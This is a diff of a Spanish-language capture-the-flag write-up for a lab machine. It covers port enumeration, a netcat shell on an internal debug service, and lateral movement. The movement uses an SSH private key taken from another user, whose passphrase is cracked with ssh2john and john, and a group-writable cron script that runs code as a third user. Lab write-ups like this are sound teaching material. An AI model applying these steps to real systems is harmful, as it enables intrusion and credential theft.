@@ -1,9 +1,9 @@
 # Reconocimiento del servidor
-
 ## Enumeración de puertos
 
+Lanzamos `ss -tulnp` para mostrar los puertos expuestos dentro de la máquina.
 ```bash
- ss -tulnp
+ss -tulnp
 Netid    State     Recv-Q    Send-Q        Local Address:Port         Peer Address:Port    Process
 udp      UNCONN    0         0                127.0.0.54:53                0.0.0.0:*
 udp      UNCONN    0         0             127.0.0.53%lo:53                0.0.0.0:*
@@ -18,6 +18,7 @@ tcp      LISTEN    0         4096          127.0.0.53%lo:53                0.0.0
 tcp      LISTEN    0         4096             127.0.0.54:53                0.0.0.0:*
 tcp      LISTEN    0         4096                   [::]:6060                 [::]:*
 ```
+Puertos expuestos internamente a atender: `1337`, `7042`, `8000` (6060 es ssh, 5042 es el servidor).
 
 ## Enumeración de servicios
 
@@ -155,6 +156,7 @@ Lanzamos un `strings` al binario y obtenemos otra flag.
 
 
 evaluator.c + error de backend 127.0.0.1 7042 internal server (debug mode)
+Con el análisis estático de `evaluator.c` y sabiendo que el proceso del backend se ejecuta con `wil` como usuario, podemos acceder al servicio a través de `netcat` y lanzar una shell.
 
 ```bash
  nc  127.0.0.1 7042
@@ -172,19 +174,42 @@ wil@hal9042:/$
 
 ### WIL
 
+Recopilación de info:
 ```bash
 wil@hal9042:~$ groups
 groups
 wil evalops
 ```
 
-- Extraemos la parte de la clave
+#### Movimiento lateral a sophie
+Hacemos un reconocimiento en su carpeta `home`, obtenemos info interesante en el archivo `/home/wil/data/personal_note.txt`.
 
-Existe `id_rsa_sophie.enc`
+Tenemos la clave privada de ssh del usuario `sophie` en `/home/wil/.ssh/id_rsa_sophie.enc`.
+
+La exfiltramos para intentar extraer la passphrase.
+Utilizamos `john` para extraer la passphrase en formato hash y después la rompemos lanzando una wordlist contra ella.
+
+```
+python3 ssh2john.py /tmp/resources/id_rsa_sophie.enc > hash.txt
+/usr/bin/john --wordlist=wordlist.txt hash.txt
+
+```
+
+
+#### Movimiento lateral a ol
+Buscamos archivos cuyo grupo sea `evalops`.
+
+```bash
+find / -group evalops 2>/dev/null
+/home/ol/scripts/check.sh
+```
+
+Leemos que el script se ejecuta desde un `crontab` con `ol` como usuario.
+Al tener el archivo permisos de escritura por grupo, podemos ejecutar código como `ol` desde el script cada cinco minutos.
 
 
 ### SOPHIE
-
+Nada que ver aquí...
 
 ### OL
 
